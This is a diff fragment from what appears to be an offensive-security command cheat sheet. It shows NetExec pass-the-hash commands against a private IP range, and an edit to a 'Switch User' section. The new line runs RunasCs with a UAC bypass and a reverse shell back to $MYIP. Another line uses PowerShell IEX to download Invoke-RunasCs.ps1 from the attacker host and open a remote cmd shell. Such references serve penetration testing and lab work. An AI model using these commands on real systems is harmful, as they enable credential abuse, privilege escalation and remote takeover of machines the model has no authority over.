@@ -1727,7 +1727,7 @@ nxc winrm 192.168.110.51-56 -u usernames -H hashes --local-auth
 nxc smb 192.168.110.51-56 -u usernames -H hashes --local-auth --shares
 
 +---------- Switch User: Known Creds ----------+
-rlwrap nc -lvnp 5566
+//$MYIP/$/RunasCs.exe --bypass-uac --logon-type 8 $USERNAME $PASSWORD cmd.exe -r $MYIP:80
 IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:139/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username $USERNAME -Password $PASSWORD -Command cmd.exe -Remote $MYIP:5566
 
 +---------- Restore AD Objects ----------+
